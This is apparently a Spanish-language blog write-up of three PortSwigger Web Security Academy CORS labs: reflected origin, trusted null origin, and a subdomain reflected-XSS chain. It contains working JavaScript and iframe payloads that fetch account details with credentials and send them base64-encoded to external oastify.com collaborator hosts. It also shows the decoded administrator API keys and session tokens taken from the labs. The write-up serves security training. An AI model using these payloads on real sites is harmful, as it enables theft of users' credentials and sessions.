---
layout: single
title: CORS - PortSwigger
excerpt: "All Cross-origin resource sharing (CORS) labs of PortSwigger."
date: 2025-08-14
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - CORS
---


## Tipos de errores CORS

- Access-Control-Allow-Credentials

```
Access-Control-Allow-Credentials: true
```

> Permite usar las credenciales desde una petición siempre y cuando lo permita el Access-Control-Allow-Origin.

- Access-Control-Allow-Origin

```
Access-Control-Allow-Origin: https://test.com
```

> Permite cualquier origen * .

```
Access-Control-Allow-Origin: null
```

> Permite únicamente origenes "especiales" como peticiones dentro de un "iframe" o wrappers como file://.

```
Access-Control-Allow-Origin: https://test.domain.com
```

> Permite únicamente subdominios.

## JavaScript TIPS

- Mandar petición con credenciales

```javascript
req.withCredentials = true;  // Añadir antes del req.open()
```

- Ejecutar función después de la petición

```javascript
req.onload= sendAPI;

function sendAPI() {
  location="https://57aizgseziang09l8ylip2971y7pvfj4.oastify.com/?response="+btoa(this.responseText);
};
```

- Enviar una petición desde 'null'

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload= sendAPI;
req.withCredentials = true;
req.open('GET','https://0aae0000041193f2805a03aa006e00f9.web-security-academy.net/accountDetails',true);
req.send();
function sendAPI() {
  location='https://mg6z8x1v8zj4phi2hfuzyjioafgf47sw.oastify.com?api='+btoa(req.responseText);
};
</script>"</iframe>
```

## CORS con reflexión básica del origen || CORS vulnerability with basic origin reflection

![](/img2/Pasted%20image%2020250813143211.png)

> Vemos que la cabecera de respuesta 'Access-Control-Allow-Credentials' está en true, esto nos permite poder enviar peticiones con las credenciales aunque no sea del mismo origen.

![](/img2/Pasted%20image%2020250813143646.png)

> Para que podamos explotar el 'Access-Control-Allow-Credentials' es necesario que el 'Access-Control-Allow-Origin' permita otros origenes fuera del suyo propio.

![](/img2/Pasted%20image%2020250813145554.png)

![](/img2/Pasted%20image%2020250813145625.png)

```bash
❯ echo "ewogICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwKICAiZW1haWwiOiAiIiwKICAiYXBpa2V5IjogIkZuWlE2VnFSZmJKcmtvOWFXOUJxZmJDNVNKR2xzZkpTIiwKICAic2Vzc2lvbnMiOiBbCiAgICAiZHp5UlE1Wkh0b2hyMVdSbW9aajFWanNUU2xCZnI3N3UiCiAgXQp9" | base64 -d | jq
```

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "FnZQ6VqRfbJrko9aW9BqfbC5SJGlsfJS",
  "sessions": [
    "dzyRQ5ZHtohr1WRmoZj1VjsTSlBfr77u"
  ]
}
```

- Injection

```html
<script>

var req = new XMLHttpRequest();

req.onload= sendAPI;
req.withCredentials = true;
req.open('GET','https://0a6d00fa047fb7e3804f49e10058008a.web-security-academy.net/accountDetails/');
req.send();

function sendAPI() {
  location="https://57aizgseziang09l8ylip2971y7pvfj4.oastify.com/?response="+btoa(this.responseText);
};

</script>
```

## CORS con origen null marcado como confiable || CORS vulnerability with trusted null origin

![](/img2/Pasted%20image%2020250813161352.png)

> Vemos que igual que antes la cabecera 'Access-Control-Allow-Credentials' está en true, sin embargo, al poner un origen no vemos la cabecera 'Access-Control-Allow-Origin'.

![](/img2/Pasted%20image%2020250813161802.png)

> Al poner el origen como 'null' se refleja en la cabecera de respuesta 'Access-Control-Allow-Origin'.

![](/img2/Pasted%20image%2020250813161914.png)

> Para enviar una petición desde un origen 'null', podemos ejecutar el script dentro de un 'iframe'.

![](/img2/Pasted%20image%2020250813161223.png)

```bash
❯ echo "ewogICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwKICAiZW1haWwiOiAiIiwKICAiYXBpa2V5IjogIlNyRkFuTmFCTm1EcHVLVEJOSUFKOUdGeWxyY1BPMVoyIiwKICAic2Vzc2lvbnMiOiBbCiAgICAiNzJoOXdabU03MUVCckVVMUpBY0FxNVpHR05VSFBhQTEiCiAgXQp9" | base64 -d | jq
```

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "SrFAnNaBNmDpuKTBNIAJ9GFylrcPO1Z2",
  "sessions": [
    "72h9wZmM71EBrEU1JAcAq5ZGGNUHPaA1"
  ]
}
```

- Injection

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload= sendAPI;
req.withCredentials = true;
req.open('GET','https://0aae0000041193f2805a03aa006e00f9.web-security-academy.net/accountDetails',true);
req.send();
function sendAPI() {
  location='https://mg6z8x1v8zj4phi2hfuzyjioafgf47sw.oastify.com?api='+btoa(req.responseText);
};
</script>"</iframe>
```

## CORS con protocolos inseguros confiables || ## CORS vulnerability with trusted insecure protocols

![](/img2/Pasted%20image%2020250814144115.png)

> Nos encontramos con el mismo escenario de antes, sin embargo, no permite el origen 'null', pero si permite cualquier subdominio del propio servidor.

![](/img2/Pasted%20image%2020250814152027.png)

![](/img2/Pasted%20image%2020250814152134.png)

![](/img2/Pasted%20image%2020250814152226.png)

> Vemos que al usar la función de 'Check stock' se envía una petición al subdominio 'stock', en el cual podemos explotar un XSS reflejado.

![](/img2/Pasted%20image%2020250814143939.png)

> Para explotar la configuración del CORS en el endpoint '/accountDetails' insertamos el siguiente script dentro del XSS:

```html
<script>
var req = new XMLHttpRequest();

req.onload=sendAPI;
req.withCredentials = true;
req.open('GET','https://0ac0005f0392066180c4c11800e900fd.web-security-academy.net/accountDetails',true);
req.send();

function sendAPI(){
  location='https://jbyoodm8q2sscouft8qeqrax3o9hxalz.oastify.com?api='+btoa(req.responseText);
};
</script>
```

![](/img2/Pasted%20image%2020250814143739.png)

```bash
❯ echo -n "ewogICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwKICAiZW1haWwiOiAiIiwKICAiYXBpa2V5IjogIkI2YmZZVU1OZmtZekhIV3hXTllLc3VZOEJEamF1c1BBIiwKICAic2Vzc2lvbnMiOiBbCiAgICAiblVOZW5yU2pNT253a0ViUDlWM2o2b2JHZ0tsRU1NN0siCiAgXQp9" | base64 -d | jq
```

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "B6bfYUMNfkYzHHWxWNYKsuY8BDjausPA",
  "sessions": [
    "nUNenrSjMOnwkEbP9V3j6obGgKlEMM7K"
  ]
}
```

- Injection

```html
<script>
  location="http://stock.0ac0005f0392066180c4c11800e900fd.web-security-academy.net/?productId=%3cscript>var req = new XMLHttpRequest();req.onload=sendAPI;req.withCredentials = true;req.open('GET','https://0ac0005f0392066180c4c11800e900fd.web-security-academy.net/accountDetails',true);req.send();function sendAPI(){  location='https://jbyoodm8q2sscouft8qeqrax3o9hxalz.oastify.com?api='%2Bbtoa(req.responseText);};%3c/script>&storeId=5"
</script>
```